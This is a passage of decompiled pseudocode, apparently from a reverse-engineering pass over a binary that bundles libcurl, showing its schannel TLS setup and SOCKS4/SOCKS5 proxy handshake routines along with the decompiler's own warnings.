    pcStack_204 = "schannel: using IP address, SNI is not supported by OS.";
    piStack_208 = (int *)param_2;
    piStack_20c = (int *)0x1ed715;
    FUN_001d9940();
  }
  if (*(char *)((int)piVar1 + 0x47) == '\0') {
    piStack_1c4 = aiStack_1e4;
    aiStack_1e4[0] = 0;
    aiStack_1e4[1] = 0;
    piStack_1dc = (int *)0x0;
    aiStack_1d8[3] = 0;
    aiStack_1d8[4] = 1;
  }
  else {
    aiStack_184[1] = 2;
    piStack_208 = (int *)auStack_1ac;
    pcStack_204 = *(char **)(iVar6 + 0x18);
    piStack_20c = (int *)0x1ed73a;
    iStack_1ec = FUN_001d6040();
    if (iStack_1ec != 0) {
      pcStack_204 = "Error setting ALPN";
      piStack_208 = (int *)param_2;
      piStack_20c = (int *)0x1ed750;
      FUN_001d9870();
      return 0x23;
    }
    piStack_208 = (int *)auStack_1ac;
    pcStack_204 = (char *)iStack_188;
    piStack_20c = (int *)auStack_17a;
    iStack_210 = 0x1ed771;
    FUN_0021b2da();
    iStack_210 = iStack_188;
    pcStack_214 = (char *)0x1ed77d;
    uStack_17c = FUN_001dccd0();
    aiStack_184[0] = uStack_17c + 6;
    piStack_1dc = aiStack_184;
    piStack_1c4 = aiStack_1e4;
    piStack_218 = (int *)auStack_1ac;
    aiStack_1e4[1] = 0x12;
    aiStack_1d8[3] = 0;
    aiStack_1d8[4] = 1;
    pcStack_214 = *(char **)(iVar6 + 0x18);
    puStack_21c = (undefined1 *)0x1ed7ce;
    aiStack_1e4[0] = iStack_188 + 10;
    FUN_001d60e0();
    puStack_21c = auStack_1ac;
    FUN_001d9940(param_2,"ALPN: curl offers %s");
  }
  piStack_1b0 = aiStack_1d8;
  aiStack_1d8[0] = 0;
  aiStack_1d8[1] = 0;
  aiStack_1d8[2] = 0;
  uStack_1b8 = 0;
  uStack_1b4 = 1;
  piVar1[0xe] = 0x811c;
  iVar4 = piVar1[0xe];
  if (*(char *)(local_1e8 + 0x67) == '\0') {
    iVar4 = 0x819c;
  }
  pcStack_204 = (char *)0x10;
  piStack_208 = (int *)0x1;
  piVar1[0xe] = iVar4;
  piStack_20c = (int *)0x1ed86a;
  iVar4 = (*DAT_00242010)();
  piVar1[1] = iVar4;
  if (iVar4 == 0) {
    pcStack_204 = "schannel: unable to allocate memory";
    piStack_208 = (int *)param_2;
    piStack_20c = (int *)0x1ed881;
    FUN_001d9870();
    return 0x1b;
  }
  pcStack_204 = (char *)(iVar4 + 8);
  piStack_208 = piVar1 + 0xf;
  piStack_20c = &uStack_1b8;
  piStack_218 = aiStack_1d8 + 3;
  pcStack_214 = (char *)0x0;
  if (*(char *)((int)piVar1 + 0x47) == '\0') {
    piStack_218 = (int *)0x0;
  }
  puStack_21c = (undefined1 *)0x0;
  iStack_210 = iVar4;
  iVar4 = (**(code **)(DAT_003602ac + 0x18))
                    (*piVar1,0,*(undefined4 *)(*piVar1 + 0x10),piVar1[0xe],0);
  if (iVar4 == 0x90312) {
    iVar4 = FUN_001d8ff0(*(undefined4 *)(iStack_1ec + 4),param_2,unaff_EDI,piStack_208,&puStack_21c)
    ;
    (**(code **)(DAT_003602ac + 0x40))(unaff_EDI);
    if ((iStack_1ec == 0) && (aiStack_1d8[0] == iVar4)) {
      piVar1[0x10] = 0;
      *(undefined2 *)(piVar1 + 0x11) = 0;
      *(undefined1 *)((int)piVar1 + 0x46) = 0;
      *(undefined1 *)(piVar1 + 0xd) = 0;
      *(undefined4 *)(iVar6 + 4) = 1;
      return 0;
    }
    pcStack_204 = (char *)aiStack_1d8[0];
    piStack_20c = (int *)0x225380;
    iStack_210 = param_2;
    pcStack_214 = (char *)0x1ed9b1;
    piStack_208 = (int *)iVar4;
    FUN_001d9870();
    return 0x23;
  }
  (*DAT_00242004)(piVar1[1]);
  piVar1[1] = 0;
  piStack_208 = (int *)auStack_104;
  pcStack_204 = (char *)0x100;
  iStack_210 = 0x1ed8ee;
  piStack_20c = (int *)iVar4;
  iStack_210 = FUN_001c9eb0();
  if (iVar4 == -0x7ff6fd00) {
    pcStack_214 = "schannel: initial InitializeSecurityContext failed: %s";
    piStack_218 = (int *)param_2;
    puStack_21c = (undefined1 *)0x1ed93a;
    FUN_001d9870();
    return 0x1b;
  }
  if (iVar4 == -0x7ff6fcde) {
    pcStack_214 = "schannel: SNI or certificate check failed: %s";
    piStack_218 = (int *)param_2;
    puStack_21c = (undefined1 *)0x1ed922;
    FUN_001d9870();
    return 0x3c;
  }
  pcStack_214 = "schannel: initial InitializeSecurityContext failed: %s";
  piStack_218 = (int *)param_2;
  puStack_21c = (undefined1 *)0x1ed90a;
  FUN_001d9870();
  return 0x23;
}

/*
 * FUNCTION FUN_00207710 @ 0x00207710  (VA = 0x160000 + RVA 0xa7710)
 * MARKERS:
 *   - Version check strings
 */

// ==== FUN_00207710 @ 00207710 (interesting=no) ====

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

int FUN_00207710(int param_1,int *param_2,int param_3)

{
  int *piVar1;
  char cVar2;
  undefined1 uVar3;
  undefined *puVar4;
  int iVar5;
  int iVar6;
  char *pcVar7;
  char *pcVar8;
  int *piVar9;
  char *pcVar10;
  undefined1 auStack_58 [3];
  char local_55;
  int *local_54;
  char *local_50;
  undefined *local_4c;
  int local_48;
  undefined1 local_44 [64];
  uint local_4;
  
  local_4 = DAT_00242400 ^ (uint)auStack_58;
  iVar6 = *(int *)(param_1 + 0xc);
  local_48 = param_1;
  cVar2 = *(char *)(iVar6 + 100);
  piVar1 = param_2 + 2;
  local_54 = (int *)0x0;
  local_4c = &DAT_0022ecde;
  local_55 = cVar2;
  switch(*param_2) {
  case 1:
    *(undefined1 *)(iVar6 + 0x4d3) = 1;
    if (*(char *)(iVar6 + 0x240) != '\0') {
      puVar4 = &DAT_00229594;
      if (cVar2 != '\x06') {
        puVar4 = &DAT_0022ecde;
      }
      FUN_001d9940(param_3,"SOCKS4%s: connecting to HTTP proxy %s port %d",puVar4,param_2[0x99],
                   param_2[0x9a]);
    }
    FUN_001d9940(param_3,"SOCKS4 communication to %s:%d",param_2[0x99],param_2[0x9a]);
    *(undefined2 *)piVar1 = 0x104;
    *(char *)((int)param_2 + 10) = (char)((uint)param_2[0x9a] >> 8);
    *(char *)((int)param_2 + 0xb) = (char)param_2[0x9a];
    if (cVar2 != '\x06') {
      iVar5 = FUN_001e1200(param_3,param_2[0x99],param_2[0x9a],1,&local_54);
      if (iVar5 == -1) {
        return 0x1b;
      }
      iVar6 = *param_2;
      if (iVar5 == 1) {
        if (iVar6 != 10) {
          *param_2 = 10;
        }
        FUN_001d9940(param_3,"SOCKS4 non-blocking resolve of %s",param_2[0x99]);
        return 0;
      }
LAB_00207847:
      if (iVar6 != 0xb) {
        *param_2 = 0xb;
      }
      goto switchD_00207767_caseD_b;
    }
    if (*param_2 != 9) {
      *param_2 = 9;
    }
    break;
  default:
    goto switchD_00207767_caseD_2;
  case 4:
    goto switchD_00207767_caseD_4;
  case 9:
    break;
  case 10:
    local_54 = (int *)FUN_001e0f70(param_3,param_2[0x99],*(undefined4 *)(iVar6 + 0xec));
    if (local_54 != (int *)0x0) {
      *(int **)(param_3 + 0x938) = local_54;
      *(undefined1 *)(param_3 + 0x94c) = 1;
      FUN_001d9940(param_3,"Hostname \'%s\' was found",param_2[0x99]);
      iVar6 = *param_2;
      goto LAB_00207847;
    }
    iVar6 = FUN_001e1700(param_3,&local_54);
    if (local_54 == (int *)0x0) {
      if (iVar6 == 0) {
        return 0;
      }
      return 0x1b;
    }
  case 0xb:
switchD_00207767_caseD_b:
    if (local_54 == (int *)0x0) {
      FUN_001d9870(param_3,"Failed to resolve \"%s\" for SOCKS4 connect.",param_2[0x99]);
      return 0x1b;
    }
    for (iVar6 = *local_54; iVar6 != 0; iVar6 = *(int *)(iVar6 + 0x1c)) {
      if (*(int *)(iVar6 + 4) == 2) {
        FUN_001e11b0(iVar6,local_44,0x40);
        iVar5 = *(int *)(iVar6 + 0x18);
        *(undefined1 *)(param_2 + 3) = *(undefined1 *)(iVar5 + 4);
        *(undefined1 *)((int)param_2 + 0xd) = *(undefined1 *)(iVar5 + 5);
        *(undefined1 *)((int)param_2 + 0xe) = *(undefined1 *)(iVar5 + 6);
        *(undefined1 *)((int)param_2 + 0xf) = *(undefined1 *)(iVar5 + 7);
        FUN_001d9940(param_3,"SOCKS4 connect to IPv4 %s (locally resolved)",local_44);
        FUN_001e1760(param_3,local_54);
        goto LAB_00207886;
      }
    }
    FUN_001d9870(param_3,"SOCKS4 connection to %s not supported",param_2[0x99]);
LAB_00207886:
    if (iVar6 == 0) {
      return 0x1b;
    }
    break;
  case 0xe:
    goto switchD_00207767_caseD_e;
  }
  piVar9 = param_2 + 4;
  *(char *)piVar9 = '\0';
  pcVar10 = (char *)param_2[0x9b];
  if (pcVar10 != (char *)0x0) {
    local_50 = pcVar10 + 1;
    pcVar7 = pcVar10;
    do {
      cVar2 = *pcVar7;
      pcVar7 = pcVar7 + 1;
    } while (cVar2 != '\0');
    if (0xff < (uint)((int)pcVar7 - (int)local_50)) {
      FUN_001d9870(param_3,"Too long SOCKS proxy user name");
      return 0xb;
    }
    FUN_0021b2da(piVar9,pcVar10,((int)pcVar7 - (int)local_50) + 1);
  }
  do {
    iVar6 = *piVar9;
    piVar9 = (int *)((int)piVar9 + 1);
  } while ((char)iVar6 != '\0');
  pcVar10 = (char *)((int)piVar9 + (9 - ((int)param_2 + 0x11)));
  pcVar7 = pcVar10;
  if (local_55 == '\x06') {
    param_2[3] = 0x1000000;
    pcVar8 = (char *)param_2[0x99];
    pcVar7 = pcVar8;
    do {
      cVar2 = *pcVar7;
      pcVar7 = pcVar7 + 1;
    } while (cVar2 != '\0');
    local_50 = pcVar8 + 1;
    if ((char *)0xff < pcVar7 + (1 - (int)(pcVar8 + 1))) {
LAB_00207b23:
      FUN_001d9870(param_3,"SOCKS4: too long host name");
      return 9;
    }
    pcVar7 = pcVar10 + (int)(pcVar7 + (1 - (int)(pcVar8 + 1)));
    local_50 = pcVar7;
    if ((char *)0x257 < pcVar7) goto LAB_00207b23;
    pcVar10 = pcVar10 + (int)piVar1;
    do {
      cVar2 = *pcVar8;
      pcVar8 = pcVar8 + 1;
      *pcVar10 = cVar2;
      pcVar10 = pcVar10 + 1;
    } while (cVar2 != '\0');
  }
  param_2[0x98] = (int)piVar1;
  param_2[1] = (int)pcVar7;
  if (*param_2 != 0xe) {
    *param_2 = 0xe;
  }
switchD_00207767_caseD_e:
  param_1 = local_48;
  iVar6 = FUN_00208770(local_48,param_2,param_3,0x1d,"SOCKS4 connect request");
  if (iVar6 == 0) {
    if (param_2[1] != 0) {
      return 0;
    }
    param_2[1] = 8;
    param_2[0x98] = (int)piVar1;
    if (*param_2 != 4) {
      *param_2 = 4;
    }
switchD_00207767_caseD_4:
    iVar6 = FUN_002086f0(param_1,param_2,param_3,0xf,"connect request ack");
    if (iVar6 == 0) {
      if (param_2[1] != 0) {
        return 0;
      }
      if (*param_2 != 0x11) {
        *param_2 = 0x11;
      }
switchD_00207767_caseD_2:
      if ((char)*piVar1 != '\0') {
        FUN_001d9870(param_3,"SOCKS4 reply has wrong version, version should be 0.");
        return 2;
      }
      uVar3 = *(undefined1 *)((int)param_2 + 9);
      switch(uVar3) {
      case 0x5a:
        puVar4 = &DAT_00229594;
        if (local_55 != '\x06') {
          puVar4 = local_4c;
        }
        FUN_001d9940(param_3,"SOCKS4%s request granted.",puVar4);
        return 0;
      case 0x5b:
        FUN_001d9870(param_3,
                     "Can\'t complete SOCKS4 connection to %d.%d.%d.%d:%d. (%d), request rejected or failed."
                     ,(char)param_2[3],*(undefined1 *)((int)param_2 + 0xd),
                     *(undefined1 *)((int)param_2 + 0xe),*(undefined1 *)((int)param_2 + 0xf),
                     CONCAT11(*(undefined1 *)((int)param_2 + 10),*(undefined1 *)((int)param_2 + 0xb)
                             ),uVar3);
        iVar6 = 0x1a;
        break;
      case 0x5c:
        FUN_001d9870(param_3,
                     "Can\'t complete SOCKS4 connection to %d.%d.%d.%d:%d. (%d), request rejected because SOCKS server cannot connect to identd on the client."
                     ,(char)param_2[3],*(undefined1 *)((int)param_2 + 0xd),
                     *(undefined1 *)((int)param_2 + 0xe),*(undefined1 *)((int)param_2 + 0xf),
                     CONCAT11(*(undefined1 *)((int)param_2 + 10),*(undefined1 *)((int)param_2 + 0xb)
                             ),uVar3);
        iVar6 = 7;
        break;
      case 0x5d:
        FUN_001d9870(param_3,
                     "Can\'t complete SOCKS4 connection to %d.%d.%d.%d:%d. (%d), request rejected because the client program and identd report different user-ids."
                     ,(char)param_2[3],*(undefined1 *)((int)param_2 + 0xd),
                     *(undefined1 *)((int)param_2 + 0xe),*(undefined1 *)((int)param_2 + 0xf),
                     CONCAT11(*(undefined1 *)((int)param_2 + 10),*(undefined1 *)((int)param_2 + 0xb)
                             ),uVar3);
        iVar6 = 8;
        break;
      default:
        FUN_001d9870(param_3,"Can\'t complete SOCKS4 connection to %d.%d.%d.%d:%d. (%d), Unknown.",
                     (char)param_2[3],*(undefined1 *)((int)param_2 + 0xd),
                     *(undefined1 *)((int)param_2 + 0xe),*(undefined1 *)((int)param_2 + 0xf),
                     CONCAT11(*(undefined1 *)((int)param_2 + 10),*(undefined1 *)((int)param_2 + 0xb)
                             ),uVar3);
        iVar6 = 0x1f;
      }
    }
  }
  return iVar6;
}

/*
 * FUNCTION FUN_00207cc0 @ 0x00207cc0  (VA = 0x160000 + RVA 0xa7cc0)
 * MARKERS:
 *   - Version check strings
 */

// ==== FUN_00207cc0 @ 00207cc0 (interesting=no) ====

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

int FUN_00207cc0(int param_1,int *param_2,int param_3)

{
  int *piVar1;
  char *pcVar2;
  char cVar3;
  int iVar4;
  char *pcVar5;
  int iVar6;
  char *pcVar7;
  uint uVar8;
  undefined1 auStack_6c [2];
  bool local_6a;
  char local_69;
  uint local_68;
  byte local_61;
  int local_60;
  int *local_5c;
  int local_58;
  int *local_54;
  uint local_50;
  uint local_4c;
  int local_48;
  int local_44;
  int iStack_40;
  int iStack_3c;
  int iStack_38;
  undefined1 local_34 [48];
  uint local_4;
  
  local_4 = DAT_00242400 ^ (uint)auStack_6c;
  local_60 = param_1;
  local_58 = *(int *)(param_1 + 0xc);
  pcVar5 = (char *)param_2[0x99];
  piVar1 = param_2 + 2;
  local_69 = *(char *)(local_58 + 100);
  pcVar7 = pcVar5;
  do {
    cVar3 = *pcVar7;
    pcVar7 = pcVar7 + 1;
  } while (cVar3 != '\0');
  local_61 = *(byte *)(param_3 + 0x48b);
  local_50 = (int)pcVar7 - (int)(pcVar5 + 1);
  local_68 = 0;
  local_6a = false;
  local_5c = (int *)0x0;
  local_48 = 2;
  switch(*param_2) {
  case 1:
    if (*(char *)(local_58 + 0x240) != '\0') {
      FUN_001d9940(param_3,"SOCKS5: connecting to HTTP proxy %s port %d",pcVar5,param_2[0x9a]);
    }
    if ((local_69 != '\x05') && (0xff < local_50)) {
      FUN_001d9870(param_3,
                   "SOCKS5: the destination hostname is too long to be resolved remotely by the proxy."
                  );
      return 9;
    }
    if ((local_61 & 0xfa) != 0) {
      FUN_001d9940(param_3,"warning: unsupported value passed to CURLOPT_SOCKS5_AUTH: %u",local_61);
    }
    if ((local_61 & 1) == 0) {
      param_2[0x9b] = 0;
    }
    *(char *)piVar1 = '\x05';
    local_6a = (local_61 & 4) == 0;
    if (local_6a) {
      *(undefined1 *)((int)param_2 + 10) = 0;
      iVar4 = 3;
    }
    else {
      iVar4 = 4;
      *(undefined2 *)((int)param_2 + 10) = 0x100;
    }
    local_6a = !local_6a;
    if (param_2[0x9b] != 0) {
      *(char *)(iVar4 + (int)piVar1) = '\x02';
      iVar4 = iVar4 + 1;
    }
    *(char *)((int)param_2 + 9) = (char)iVar4 + -2;
    param_2[0x98] = (int)piVar1;
    param_2[1] = iVar4;
    iVar4 = FUN_00208770(local_60,param_2,param_3,0x1d,"initial SOCKS5 request");
    if (iVar4 != 0) {
      return iVar4;
    }
    if (param_2[1] != 0) {
      return 0;
    }
    if (*param_2 != 4) {
      *param_2 = 4;
    }
    break;
  case 2:
    iVar4 = FUN_00208770(param_1,param_2,param_3,0x1d,"initial SOCKS5 request");
    if (iVar4 != 0) {
      return iVar4;
    }
    if (param_2[1] != 0) {
      return 0;
    }
    break;
  case 3:
    break;
  case 4:
    goto switchD_00207d42_caseD_4;
  default:
    goto switchD_00207d42_caseD_5;
  case 6:
    goto switchD_00207d42_caseD_6;
  case 7:
    goto switchD_00207d42_caseD_7;
  case 8:
    goto LAB_00208107;
  case 9:
    goto switchD_00207d42_caseD_9;
  case 10:
    local_5c = (int *)FUN_001e0f70(param_3,pcVar5,param_2[0x9a]);
    if (local_5c != (int *)0x0) {
      *(int **)(param_3 + 0x938) = local_5c;
      *(undefined1 *)(param_3 + 0x94c) = 1;
      FUN_001d9940(param_3,"SOCKS5: hostname \'%s\' found",param_2[0x99]);
      if (local_5c != (int *)0x0) goto switchD_00207d42_caseD_b;
    }
    iVar4 = FUN_001e1700(param_3,&local_5c);
    if (local_5c == (int *)0x0) {
      if (iVar4 == 0) {
        return 0;
      }
      return 0x1b;
    }
  case 0xb:
    goto switchD_00207d42_caseD_b;
  case 0xc:
    *(undefined2 *)piVar1 = 0x105;
    *(undefined1 *)((int)param_2 + 10) = 0;
    local_68 = 3;
    if (local_69 == '\x05') goto switchD_00207d42_caseD_d;
    goto LAB_002083e0;
  case 0xd:
    goto switchD_00207d42_caseD_d;
  case 0xe:
    goto switchD_00207d42_caseD_e;
  case 0xf:
    goto LAB_00208545;
  case 0x10:
    goto LAB_0020865a;
  }
  param_2[1] = 2;
  param_2[0x98] = (int)piVar1;
switchD_00207d42_caseD_4:
  iVar4 = local_60;
  iVar6 = FUN_002086f0(local_60,param_2,param_3,0xf,"initial SOCKS5 response");
  if (iVar6 != 0) {
    return iVar6;
  }
  if (param_2[1] != 0) {
    return 0;
  }
  if ((char)*piVar1 != '\x05') {
    FUN_001d9870(param_3,"Received invalid version in initial SOCKS5 response.");
    return 2;
  }
  cVar3 = *(char *)((int)param_2 + 9);
  if (cVar3 != '\0') {
    if (cVar3 != '\x02') {
      if (cVar3 == '\x01') {
        if (local_6a == false) {
          FUN_001d9870(param_3,"SOCKS5 GSSAPI per-message authentication is not supported.");
          return 5;
        }
        if (*param_2 != 5) {
          *param_2 = 5;
        }
        iVar4 = FUN_002156d0(iVar4,param_3);
        if (iVar4 != 0) {
          FUN_001d9870(param_3,"Unable to negotiate SOCKS5 GSS-API context.");
          return 4;
        }
      }
      else if (cVar3 == -1) {
        FUN_001d9870(param_3,"No authentication method was acceptable.");
        return 0xc;
      }
      FUN_001d9870(param_3,"Undocumented SOCKS5 mode attempted to be used by server.");
      return 0x20;
    }
    if (*param_2 != 6) {
      *param_2 = 6;
    }
switchD_00207d42_caseD_6:
    pcVar5 = (char *)param_2[0x9b];
    local_54 = param_2 + 0x9c;
    if ((pcVar5 == (char *)0x0) || (pcVar7 = (char *)*local_54, pcVar7 == (char *)0x0)) {
      local_4c = 0;
      local_68 = 0;
    }
    else {
      pcVar2 = pcVar5 + 1;
      do {
        cVar3 = *pcVar5;
        pcVar5 = pcVar5 + 1;
      } while (cVar3 != '\0');
      local_4c = (int)pcVar5 - (int)pcVar2;
      pcVar5 = pcVar7 + 1;
      do {
        cVar3 = *pcVar7;
        pcVar7 = pcVar7 + 1;
      } while (cVar3 != '\0');
      local_68 = (int)pcVar7 - (int)pcVar5;
    }
    *(char *)piVar1 = '\x01';
    *(char *)((int)param_2 + 9) = (char)local_4c;
    if ((param_2[0x9b] != 0) && (local_4c != 0)) {
      if (0xff < local_4c) {
        FUN_001d9870(param_3,"Excessive user name length for proxy auth");
        return 0xb;
      }
      FUN_0021b2da((int)param_2 + 10,param_2[0x9b],local_4c);
    }
    *(char *)((int)piVar1 + local_4c + 2) = (char)local_68;
    iVar4 = local_4c + 3;
    if ((*local_54 != 0) && (local_68 != 0)) {
      if (0xff < local_68) {
        FUN_001d9870(param_3,"Excessive password length for proxy auth");
        return 10;
      }
      FUN_0021b2da((char *)((int)piVar1 + iVar4),*local_54,local_68);
    }
    if (*param_2 != 7) {
      *param_2 = 7;
    }
    param_2[1] = iVar4 + local_68;
    param_2[0x98] = (int)piVar1;
switchD_00207d42_caseD_7:
    param_1 = local_60;
    iVar4 = FUN_00208770(local_60,param_2,param_3,0x1c,"SOCKS5 sub-negotiation request");
    if (iVar4 != 0) {
      return iVar4;
    }
    if (param_2[1] != 0) {
      return 0;
    }
    param_2[0x98] = (int)piVar1;
    param_2[1] = 2;
    if (*param_2 != 8) {
      *param_2 = 8;
    }
LAB_00208107:
    iVar4 = FUN_002086f0(param_1,param_2,param_3,0xe,"SOCKS5 sub-negotiation response");
    if (iVar4 != 0) {
      return iVar4;
    }
    if (param_2[1] != 0) {
      return 0;
    }
    if (*(char *)((int)param_2 + 9) != '\0') {
      FUN_001d9870(param_3,"User was rejected by the SOCKS5 server (%d %d).",(char)*piVar1,
                   *(char *)((int)param_2 + 9));
      return 0x21;
    }
  }
  if (*param_2 != 9) {
    *param_2 = 9;
  }
switchD_00207d42_caseD_9:
  if (local_69 == '\x05') {
    iVar4 = FUN_001e1200(param_3,param_2[0x99],param_2[0x9a],1,&local_5c);
    if (iVar4 == -1) {
      return 0x1b;
    }
    if (iVar4 == 1) {
      if (*param_2 == 10) {
        return 0;
      }
      *param_2 = 10;
      return 0;
    }
    if (*param_2 != 0xb) {
      *param_2 = 0xb;
    }
switchD_00207d42_caseD_b:
    iVar4 = 0;
    if (local_5c != (int *)0x0) {
      iVar4 = *local_5c;
    }
    if (*(char *)(param_3 + 0x4a8) != '\0') {
      iVar6 = 0x17;
      if (*(char *)(param_3 + 0x4a8) == '\x01') {
        iVar6 = local_48;
      }
      for (; iVar4 != 0; iVar4 = *(int *)(iVar4 + 0x1c)) {
        if (*(int *)(iVar4 + 4) == iVar6) goto LAB_002082a2;
      }
LAB_002082a6:
      FUN_001d9870(param_3,"Failed to resolve \"%s\" for SOCKS5 connect.",param_2[0x99]);
      return 0x1b;
    }
LAB_002082a2:
    if (iVar4 == 0) goto LAB_002082a6;
    FUN_001e11b0(iVar4,local_34,0x2e);
    *(undefined2 *)piVar1 = 0x105;
    *(undefined1 *)((int)param_2 + 10) = 0;
    local_68 = 3;
    if (*(int *)(iVar4 + 4) == 2) {
      *(undefined1 *)((int)param_2 + 0xb) = 1;
      iVar4 = *(int *)(iVar4 + 0x18);
      local_68 = 8;
      *(undefined1 *)(param_2 + 3) = *(undefined1 *)(iVar4 + 4);
      *(undefined1 *)((int)param_2 + 0xd) = *(undefined1 *)(iVar4 + 5);
      *(undefined1 *)((int)param_2 + 0xe) = *(undefined1 *)(iVar4 + 6);
      *(undefined1 *)((int)param_2 + 0xf) = *(undefined1 *)(iVar4 + 7);
      FUN_001d9940(param_3,"SOCKS5 connect to %s:%d (locally resolved)",local_34,param_2[0x9a]);
      FUN_001e1760(param_3,local_5c);
    }
    else if (*(int *)(iVar4 + 4) == 0x17) {
      *(undefined1 *)((int)param_2 + 0xb) = 4;
      iVar6 = 0;
      iVar4 = *(int *)(iVar4 + 0x18);
      local_68 = 0x14;
      do {
        *(undefined1 *)((int)param_2 + iVar6 + 0xc) = *(undefined1 *)(iVar4 + 8 + iVar6);
        iVar6 = iVar6 + 1;
      } while (iVar6 < 0x10);
      FUN_001d9940(param_3,"SOCKS5 connect to [%s]:%d (locally resolved)",local_34,param_2[0x9a]);
      FUN_001e1760(param_3,local_5c);
    }
    else {
      FUN_001d9870(param_3,"SOCKS5 connection to %s not supported",local_34);
      FUN_001e1760(param_3,local_5c);
    }
  }
  else {
    *(undefined2 *)piVar1 = 0x105;
    *(undefined1 *)((int)param_2 + 10) = 0;
LAB_002083e0:
    if (*(char *)(local_58 + 0x24b) == '\0') {
      iVar4 = FUN_001ee780(2,param_2[0x99],&local_54);
      if (iVar4 == 1) {
        *(undefined1 *)((int)param_2 + 0xb) = 1;
        param_2[3] = (int)local_54;
        local_68 = 8;
      }
      else {
        *(undefined1 *)((int)param_2 + 0xb) = 3;
        *(char *)(param_2 + 3) = (char)local_50;
        FUN_0021b2da((int)param_2 + 0xd,param_2[0x99],local_50);
        local_68 = local_50 + 5;
      }
    }
    else {
      iVar4 = FUN_001ee780(0x17,param_2[0x99],&local_44);
      if (iVar4 != 1) {
        return 1;
      }
      *(undefined1 *)((int)param_2 + 0xb) = 4;
      local_68 = 0x14;
      param_2[3] = local_44;
      param_2[4] = iStack_40;
      param_2[5] = iStack_3c;
      param_2[6] = iStack_38;
    }
    FUN_001d9940(param_3,"SOCKS5 connect to %s:%d (remotely resolved)",param_2[0x99],param_2[0x9a]);
  }
switchD_00207d42_caseD_d:
  *(char *)(local_68 + (int)piVar1) = (char)((uint)param_2[0x9a] >> 8);
  *(char *)(local_68 + 1 + (int)piVar1) = (char)param_2[0x9a];
  if (*(int *)(local_58 + 0x4bc) != 0) {
LAB_00208501:
    FUN_001d9870(param_3,"SOCKS5 GSS-API protection not yet implemented.");
    return 6;
  }
  param_2[0x98] = (int)piVar1;
  param_2[1] = local_68 + 2;
  if (*param_2 != 0xe) {
    *param_2 = 0xe;
  }
switchD_00207d42_caseD_e:
  param_1 = local_60;
  iVar4 = FUN_00208770(local_60,param_2,param_3,0x1e,"SOCKS5 connect request");
  if (iVar4 != 0) {
    return iVar4;
  }
  if (param_2[1] != 0) {
    return 0;
  }
  if (*(int *)(local_58 + 0x4bc) != 0) goto LAB_00208501;
  param_2[1] = 10;
  param_2[0x98] = (int)piVar1;
  if (*param_2 != 0xf) {
    *param_2 = 0xf;
  }
LAB_00208545:
  iVar4 = FUN_002086f0(param_1,param_2,param_3,0x10,"SOCKS5 connect request ack");
  if (iVar4 != 0) {
    return iVar4;
  }
  if (param_2[1] != 0) {
    return 0;
  }
  if ((char)*piVar1 != '\x05') {
    FUN_001d9870(param_3,"SOCKS5 reply has wrong version, version should be 5.");
    return local_48;
  }
  if (*(byte *)((int)param_2 + 9) != 0) {
    uVar8 = (uint)*(byte *)((int)param_2 + 9);
    iVar4 = 0x19;
    FUN_001d9870(param_3,"Can\'t complete SOCKS5 connection to %s. (%d)",param_2[0x99],uVar8);
    if (uVar8 < 9) {
      iVar4 = *(int *)(&DAT_0022950c + uVar8 * 4);
    }
    return iVar4;
  }
  cVar3 = *(char *)((int)param_2 + 0xb);
  if (cVar3 == '\x03') {
    uVar8 = *(byte *)(param_2 + 3) + 7;
  }
  else if (cVar3 == '\x04') {
    uVar8 = 0x16;
  }
  else {
    if (cVar3 != '\x01') {
      FUN_001d9870(param_3,"SOCKS5 reply has wrong address type.");
      return 1;
    }
    uVar8 = 10;
  }
  if (*(int *)(local_58 + 0x4bc) == 0) {
    iVar4 = *param_2;
    if (10 < uVar8) {
      param_2[1] = uVar8 - 10;
      param_2[0x98] = (int)param_2 + 0x12;
      if (iVar4 != 0x10) {
        *param_2 = 0x10;
      }
      goto LAB_0020865a;
    }
  }
  else {
LAB_0020865a:
    iVar4 = FUN_002086f0(param_1,param_2,param_3,0xd,"SOCKS5 connect request address");
    if (iVar4 != 0) {
      return iVar4;
    }
    if (param_2[1] != 0) {
      return 0;
    }
    iVar4 = *param_2;
  }
  if (iVar4 != 0x11) {
    *param_2 = 0x11;
  }
switchD_00207d42_caseD_5:
  FUN_001d9940(param_3,"SOCKS5 request granted.");
  return 0;
}

/*
 * FUNCTION FUN_0020f900 @ 0x0020f900  (VA = 0x160000 + RVA 0xaf900)
 * MARKERS:
 *   - Version check strings
 */

// ==== FUN_0020f900 @ 0020f900 (interesting=no) ====

/* WARNING: Instruction at (ram,0x0020fca0) overlaps instruction at (ram,0x0020fc9f)
    */
/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

undefined4 FUN_0020f900(int param_1,int param_2)

{
  byte *pbVar1;
  undefined1 *puVar2;
  char cVar3;
  int iVar4;
  int iVar5;
  int *piVar6;
  uint uVar7;
  undefined4 uVar8;
  uint extraout_ECX;
  uint extraout_ECX_00;
  int unaff_EBX;
  int unaff_EBP;
  int unaff_ESI;
  undefined4 uVar9;
  undefined8 uVar10;
  int local_160 [18];
  int aiStack_118 [2];
  undefined1 auStack_110 [268];
  uint local_4;
  
  local_4 = DAT_00242400 ^ (uint)local_160;
  iVar5 = *(int *)(param_1 + 8);
  local_160[4] = param_1;
  local_160[5] = iVar5;
  iVar4 = FUN_001d6ab0(param_1);
  local_160[6] = FUN_001d6a90(param_1,param_2);
  local_160[1] = 0;
  local_160[0] = 0;
  local_160[2] = 0;
  local_160[3] = 0;
  iVar5 = (**(code **)(DAT_003602ac + 0x2c))
                    (*(undefined4 *)(*(int *)(iVar5 + 0x1c) + 4),0x53,local_160 + 1);
  if ((iVar5 == 0) && (unaff_EBP != 0)) {
    if (((*(int *)(iVar4 + 4) != 0) || (*(int *)(iVar4 + 0x24) != 0)) &&
       (*(char *)(*(int *)(local_160[2] + 0x1c) + 0x48) != '\0')) {
      cVar3 = FUN_0020b9e0(6,1,0,2,0);
      if (cVar3 == '\0') {
        param_1 = FUN_001ec120(param_1,param_2);
        if (param_1 == 0) {
          piVar6 = (int *)FUN_018d51ee(2,0,0,0x2000,0);
          uRam75db85d8 = uRam75db85d8 & extraout_ECX;
          *piVar6 = *piVar6 + (int)piVar6;
          *(char *)(iVar4 + 0x50702444) = *(char *)(iVar4 + 0x50702444) + (char)extraout_ECX;
          uVar7 = FUN_0064aeed();
          (**(code **)((uVar7 & 0xac0de850) + 0x68))();
          func_0x56211ceb();
          FUN_001d9870();
          uVar9 = 0x4d;
        }
        else {
